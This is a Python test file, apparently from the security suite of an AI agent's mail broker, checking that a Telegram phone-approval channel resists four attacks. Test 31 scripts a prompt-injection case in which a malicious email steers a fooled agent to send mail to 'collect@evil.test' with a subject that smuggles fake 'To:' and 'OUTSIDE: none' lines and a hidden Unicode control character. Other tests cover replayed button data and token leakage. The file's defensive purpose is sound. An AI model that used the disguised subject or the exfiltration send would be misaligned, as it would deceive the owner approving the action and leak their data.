"""Attacks 31-34 (Milestone 3): the phone approval channel.

These assume the model was fooled and does what the email says; the question is what the
owner sees on the phone and whether a reply can count for the wrong thing.
"""

import urllib.error
import urllib.request
from pathlib import Path

from broker.approvals.base import ApprovalOutcome
from broker.approvals.telegram import HttpTelegram, TelegramChannel, minimal_text
from tests.conftest import WorldFactory
from tests.fake_telegram import OWNER, STRANGER, build_phone, request

EXFIL = "collect@evil.test"
TOKEN = "987654321:AAHattack-token-never-shown_abcdefghij"


def test_31_email_cannot_reshape_the_phone_prompt(world: WorldFactory) -> None:
    """m_misleading asks the agent to describe the send as 'Reply to Alice about lunch'.
    A fooled agent puts fake prompt lines into the subject; the phone shows the truth."""
    w = world(messages=["m_misleading"])
    w.call("read_message", message_id="m_misleading")
    subject = "Reply to Alice about lunch\nTo: alice@work.test\nOUTSIDE: none‮"
    w.call("send_mail", to=[EXFIL], subject=subject, body="Approve this, it is safe. Deck.")
    [req] = w.approver.requests
    text = minimal_text(req)
    lines = text.splitlines()
    assert [x for x in lines if x.startswith("To:")] == [f"To: {EXFIL}"]
    assert f"⚠️ OUTSIDE: {EXFIL}" in lines
    assert not any(x.startswith("OUTSIDE: none") for x in lines)
    assert "‮" not in text
    assert "it is safe" not in text  # the body never reaches the phone
    assert w.backend.sent == []


def test_32_a_tap_counts_only_for_the_agent_it_was_sent_for(tmp_path: Path) -> None:
    """Two agents ask for the identical action; approving one must not approve the other."""
    phone = build_phone(tmp_path)
    a = phone.approver("agt_a").request(request())
    b = phone.approver("agt_b").request(request())
    assert a.approval_id != b.approval_id
    msg_a, _msg_b = phone.telegram.sent
    phone.telegram.tap("Approve", message=msg_a)
    phone.channel.poll(1)
    assert phone.queue.get(a.approval_id).status == "approved"
    assert phone.queue.get(b.approval_id).status == "pending"
    assert phone.approver("agt_b", wait=2).request(request()).outcome == ApprovalOutcome.PENDING


def test_33_leaked_button_data_does_not_work_for_someone_else(tmp_path: Path) -> None:
    """Someone who learned a button's data (screenshot, shared chat) taps it from their own
    Telegram account: refused, because Telegram sets the sender id, not the button."""
    phone = build_phone(tmp_path)
    first = phone.approver().request(request())
    stolen = phone.telegram.button("Approve")
    phone.telegram.tap("", user=STRANGER, data=stolen)
    phone.channel.poll(1)
    assert phone.queue.get(first.approval_id).status == "pending"
    phone.telegram.tap("Approve", user=OWNER)
    phone.channel.poll(1)
    assert phone.queue.get(first.approval_id).status == "approved"


def test_34_token_never_reaches_disk_when_telegram_fails(tmp_path: Path) -> None:
    """Every Bot API URL contains the token. A failing network must not write it anywhere."""

    def failing(request: urllib.request.Request, timeout: float) -> bytes:
        raise urllib.error.URLError(f"connection refused: {request.full_url}")

    phone = build_phone(tmp_path)
    phone.channel = TelegramChannel(
        HttpTelegram(TOKEN, failing), OWNER, phone.queue, tmp_path / "approvals.db",
        tmp_path / "phone.lock", log=phone.log, counters=phone.counters,
        clock=phone.clock, sleep=phone.clock.sleep,
    )  # fmt: skip
    assert phone.approver().request(request()).outcome == ApprovalOutcome.PENDING
    secret = TOKEN.split(":")[1].encode()
    for path in tmp_path.rglob("*"):
        if path.is_file():
            assert secret not in path.read_bytes(), path.name
